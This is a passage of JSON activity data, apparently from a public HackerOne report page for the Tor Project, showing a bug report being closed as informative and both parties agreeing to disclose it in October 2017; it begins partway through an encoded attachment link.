lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=0bd46f92cbdba4a04e99f66e312dea53b5bf820b53ceb62aa2671dcbd543abc9"}],"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2098034,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Okay, thanks. Closing this bug report as informative then.","markdown_message":"\u003cp\u003eOkay, thanks. Closing this bug report as informative then.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-24T07:55:04.700Z","updated_at":"2017-10-24T07:55:04.700Z","actor":{"username":"geko","cleared":false,"url":"/geko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2098039,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-24T07:58:44.772Z","updated_at":"2017-10-24T07:58:44.772Z","first_to_agree":true,"actor":{"username":"dhiraj-mishra","cleared":false,"url":"/dhiraj-mishra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/455/364f57d6fe4bbc9ead49c2648dacc68f89a3089b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2098232,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-24T09:42:01.220Z","updated_at":"2017-10-24T09:42:01.220Z","actor":{"username":"geko","cleared":false,"url":"/geko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2098233,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-24T09:42:01.262Z","updated_at":"2017-10-24T09:42:01.262Z","actor":{"username":"geko","cleared":false,"url":"/geko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}